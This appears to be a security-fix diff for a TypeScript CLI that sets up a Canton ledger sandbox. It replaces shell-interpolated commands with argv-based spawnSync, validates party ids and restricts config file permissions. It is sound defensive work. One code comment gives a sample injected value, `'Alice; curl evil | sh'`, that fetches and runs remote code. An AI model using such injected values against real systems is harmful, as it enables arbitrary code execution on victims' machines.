@@ -16,7 +16,7 @@
  */
 
 import type { ArgumentsCamelCase, Argv } from 'yargs';
-import { spawn, execSync, type ChildProcess } from 'node:child_process';
+import { spawn, spawnSync, execSync, type ChildProcess } from 'node:child_process';
 import { createConnection } from 'node:net';
 import { writeFileSync, existsSync } from 'node:fs';
 import { join } from 'node:path';
@@ -70,6 +70,43 @@ function tryExec(cmd: string): string | null {
   } catch {
     return null;
   }
+}
+
+/**
+ * Run a command with an explicit argv array and NO shell, returning
+ * trimmed stdout or null on failure. Use this whenever any argument is
+ * derived from user input (e.g. party ids) — `execSync` with an
+ * interpolated string would let `--parties 'Alice; curl evil | sh'`
+ * execute arbitrary commands.
+ */
+function tryExecArgs(file: string, args: readonly string[]): string | null {
+  try {
+    const r = spawnSync(file, [...args], {
+      encoding: 'utf-8',
+      stdio: ['pipe', 'pipe', 'pipe'],
+      shell: false,
+    });
+    if (r.status !== 0 || r.error) return null;
+    return (r.stdout ?? '').trim();
+  } catch {
+    return null;
+  }
+}
+
+/**
+ * Validate a Canton party id before it is ever passed to a command.
+ * Party ids are `<name>::<fingerprint>` (or a bare name pre-allocation);
+ * the allowed character set is conservative and excludes every shell
+ * metacharacter. Throws on anything suspicious.
+ */
+function assertSafePartyId(party: string): string {
+  if (!/^[A-Za-z0-9_:.-]+$/.test(party)) {
+    throw new Error(
+      `Refusing to allocate party with unsafe characters: ${JSON.stringify(party)}. ` +
+        `Party ids may contain only letters, digits, and _ : . -`,
+    );
+  }
+  return party;
 }
 
 /** Wait until a TCP connection can be established on localhost:port. */
@@ -302,16 +339,23 @@ export async function handler(argv: ArgumentsCamelCase<SandboxArgs>): Promise<vo
   const failedParties: string[] = [];
 
   for (const party of parties) {
-    const result = tryExec(
-      `canton ledger allocate-parties --host localhost --port ${port} --parties ${party}`,
-    );
+    // Validate then pass as an argv array (no shell interpolation).
+    assertSafePartyId(party);
+    const result = tryExecArgs('canton', [
+      'ledger', 'allocate-parties',
+      '--host', 'localhost',
+      '--port', String(port),
+      '--parties', party,
+    ]);
     if (result !== null) {
       allocatedParties.push(party);
     } else {
       // Try alternative dpm-based allocation
-      const altResult = tryExec(
-        `dpm ledger allocate-party --port ${port} --party ${party}`,
-      );
+      const altResult = tryExecArgs('dpm', [
+        'ledger', 'allocate-party',
+        '--port', String(port),
+        '--party', party,
+      ]);
       if (altResult !== null) {
         allocatedParties.push(party);
       } else {
@@ -348,7 +392,10 @@ export async function handler(argv: ArgumentsCamelCase<SandboxArgs>): Promise<vo
   ].join('\n');
 
   try {
-    writeFileSync(configPath, configContent, 'utf-8');
+    // Write owner-read/write only (0600). The config file may hold a
+    // `token:` and lands in $HOME; the default umask would otherwise make it
+    // world-readable (0644).
+    writeFileSync(configPath, configContent, { encoding: 'utf-8', mode: 0o600 });
     step8.succeed(`Config written to ${chalk.cyan(configPath)}`);
   } catch (err) {
     step8.warn(`Could not write config: ${err instanceof Error ? err.message : String(err)}`);
